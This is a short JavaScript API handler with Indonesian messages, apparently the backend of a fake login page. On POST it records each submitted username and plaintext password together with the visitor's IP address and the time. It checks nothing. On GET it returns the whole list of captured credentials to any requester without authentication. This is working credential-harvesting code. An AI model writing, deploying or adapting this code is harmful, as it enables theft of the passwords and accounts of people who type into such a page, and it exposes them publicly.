let logs = [];

export default function handler(req, res) {
  if (req.method === "POST") {
    const { username, password } = req.body;
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
    const waktu = new Date().toLocaleString("id-ID");

    logs.push({ username, password, ip, waktu });
    res.status(200).json({ success: true, message: "Login tersimpan" });

  } else if (req.method === "GET") {
    res.status(200).json(logs);

  } else {
    res.status(405).json({ error: "Method not allowed" });
  }
}
